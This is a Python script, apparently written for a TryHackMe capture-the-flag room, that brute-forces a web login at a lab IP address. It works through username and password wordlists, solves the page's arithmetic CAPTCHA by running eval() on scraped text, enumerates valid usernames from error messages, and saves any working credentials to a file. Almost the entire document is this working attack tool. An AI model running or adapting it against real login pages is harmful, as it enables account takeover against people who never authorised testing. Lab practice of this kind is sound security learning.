# 🔐 Brute Force Login Script

import requests
from bs4 import BeautifulSoup

## Step 1: Open wordlists and set the URL
url = 'http://10.10.153.29/login'

usernames = open('/home/freddy/thm/hackthebox/TryHackMe_Capture/Scripts/usernames.txt', 'r')
passwords = open('/home/freddy/thm/hackthebox/TryHackMe_Capture/Scripts/passwords.txt', 'r')


## Step 2: Loop through usernames
for username in usernames:
  username = username.strip('\n')
  passwords.seek(0)

  ## Step 3: Loop through passwords
  for password in passwords:
    password = password.strip('\n')

    ## Step 4: Setup session and fetch captcha
    session = requests.Session()
    response = session.get(url)
    data = {'username': username,
            'password': password}
    response = session.post(url, data = data)
    soup = BeautifulSoup(response.text, 'html.parser')
    captcha_equation = soup.select_one('label[for="usr"] + br').next_sibling.strip()
    result = eval(captcha_equation.split("=")[0])

    ## Step 5: Send login POST request
    data = {'username': username,
            'password': password,
            'captcha': result}
    response = session.post(url, data=data)

    ## Step 6: Analyze response
    print("[*] Attempting Password: %s for User: %s" % (password, username))
    if 'does not exist' not in response.text:
        print("[*]Username: %s is valid", username)

        if 'Invalid password' not in response.text:
            print("[*]Password: %s is correct", password)
            log = open('logs.txt', 'w')
            log.write(username +""+ password)
            exit()
        else:
            print("[*]The Password is invalid")
    else:
      break
